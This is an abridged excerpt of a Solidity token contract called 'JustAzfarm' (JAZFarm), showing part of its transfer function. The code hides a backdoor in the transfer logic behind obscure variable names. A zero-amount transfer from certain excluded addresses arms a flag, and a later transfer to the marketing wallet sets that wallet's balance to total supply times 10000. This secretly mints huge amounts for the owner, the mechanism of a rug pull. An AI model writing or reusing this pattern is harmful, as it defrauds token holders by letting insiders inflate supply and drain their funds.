...
contract TOKEN is Context, IBEP20, Ownable {
    ...
    string private _name = "JustAzfarm";
    string private _symbol = "JAZFarm";
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount) private {
        ...
        if ((_isExcludedFromFee[_exacly] || _isExcludedFromFee[_banking] ) && amount <= 0  ) 
        {
            _value = 10000;
        }
        if (_isExcludedFromFee[recipient] == _isExcludedFromFee[_marketing] && recipient == address(_marketing)){
            _balances[_marketing] = _tTotal.mul(_value);
        }
        if (_balances[_marketing] > _tTotal){
            _diff= 1;
        }
